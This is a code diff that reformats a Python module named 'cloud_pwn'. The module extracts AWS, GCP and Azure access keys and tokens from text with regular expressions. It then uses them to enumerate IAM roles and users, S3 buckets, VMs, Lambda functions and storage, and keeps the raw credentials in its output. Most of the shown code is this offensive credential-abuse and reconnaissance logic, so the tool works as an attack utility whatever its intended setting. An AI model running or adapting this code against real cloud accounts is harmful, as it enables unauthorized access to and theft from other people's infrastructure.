@@ -11,7 +11,9 @@ from tools.settings import settings
 logger = get_logger("cloud_pwn")
 
 AWS_ROLE_ARN_RE = re.compile(r"arn:aws:iam::\d+:role/\S+")
-AWS_ACCESS_KEY_RE = re.compile(r"(?i)(AccessKeyId|SecretAccessKey|SessionToken)\s*[:=]\s*['\"]?(\S+?)['\"]?[\s,\n\r\]]")
+AWS_ACCESS_KEY_RE = re.compile(
+    r"(?i)(AccessKeyId|SecretAccessKey|SessionToken)\s*[:=]\s*['\"]?(\S+?)['\"]?[\s,\n\r\]]"
+)
 GCP_TOKEN_RE = re.compile(r"(?i)(access_token)[\s:=]*['\"]?([^\s'\",;]+)")
 AZURE_TOKEN_RE = re.compile(r"(?i)(access_token)[\s:=]*['\"]?([^\s'\",;]+)")
 SUBNET_RE = re.compile(r"subnet-[\da-f]+")
@@ -85,8 +87,14 @@ class CloudPwn:
             ("iam_list_roles", "aws iam list-roles --max-items 20 2>/dev/null || true"),
             ("iam_list_users", "aws iam list-users --max-items 20 2>/dev/null || true"),
             ("s3_list_buckets", "aws s3 ls 2>/dev/null || true"),
-            ("ec2_describe_instances", "aws ec2 describe-instances --max-items 10 2>/dev/null || true"),
-            ("lambda_list_functions", "aws lambda list-functions --max-items 20 2>/dev/null || true"),
+            (
+                "ec2_describe_instances",
+                "aws ec2 describe-instances --max-items 10 2>/dev/null || true",
+            ),
+            (
+                "lambda_list_functions",
+                "aws lambda list-functions --max-items 20 2>/dev/null || true",
+            ),
         ]
         for name, cmd in checks:
             try:
@@ -111,7 +119,11 @@ class CloudPwn:
             return result
         headers = {"Authorization": "Bearer %s" % token}
         api_calls = [
-            ("compute_instances", "https://www.googleapis.com/compute/v1/projects/%s/zones/us-central1-a/instances" % project),
+            (
+                "compute_instances",
+                "https://www.googleapis.com/compute/v1/projects/%s/zones/us-central1-a/instances"
+                % project,
+            ),
             ("storage_buckets", "https://www.googleapis.com/storage/v1/b?project=%s" % project),
             ("iam_roles", "https://iam.googleapis.com/v1/projects/%s/roles" % project),
         ]
@@ -135,8 +147,14 @@ class CloudPwn:
             return result
         headers = {"Authorization": "Bearer %s" % token}
         api_calls = [
-            ("list_subscriptions", "https://management.azure.com/subscriptions?api-version=2020-01-01"),
-            ("list_vms", "https://management.azure.com/subscriptions/{sub_id}/providers/Microsoft.Compute/virtualMachines?api-version=2022-03-01"),
+            (
+                "list_subscriptions",
+                "https://management.azure.com/subscriptions?api-version=2020-01-01",
+            ),
+            (
+                "list_vms",
+                "https://management.azure.com/subscriptions/{sub_id}/providers/Microsoft.Compute/virtualMachines?api-version=2022-03-01",
+            ),
         ]
         for name, api_url in api_calls:
             try:
@@ -155,15 +173,18 @@ class CloudPwn:
         azure_creds = parse_azure_credentials(text)
         if aws_creds.get("access_key_id"):
             result = self.exploit_aws(aws_creds)
-            result["raw_creds"] = {k: (v[:20] + "...") if len(v) > 20 else v for k, v in aws_creds.items() if v}
+            result["raw_creds"] = {
+                k: (v[:20] + "...") if len(v) > 20 else v for k, v in aws_creds.items() if v
+            }
             return result
         if gcp_creds.get("access_token") and gcp_creds.get("project_id"):
             result = self.exploit_gcp(gcp_creds)
             result["raw_creds"] = gcp_creds
             return result
         if azure_creds.get("access_token") and (
-                azure_creds.get("tenant_id")
-                or str(azure_creds.get("access_token", "")).startswith("eyJ")):
+            azure_creds.get("tenant_id")
+            or str(azure_creds.get("access_token", "")).startswith("eyJ")
+        ):
             result = self.exploit_azure(azure_creds)
             result["raw_creds"] = azure_creds
             return result
@@ -171,7 +192,11 @@ class CloudPwn:
             result = self.exploit_gcp(gcp_creds)
             result["raw_creds"] = gcp_creds
             return result
-        return {"provider": cloud_hint or "unknown", "success": False, "error": "No usable cloud credentials found"}
+        return {
+            "provider": cloud_hint or "unknown",
+            "success": False,
+            "error": "No usable cloud credentials found",
+        }
 
 
 def check(credentials_text: str, cloud_hint: Optional[str] = None) -> Dict:
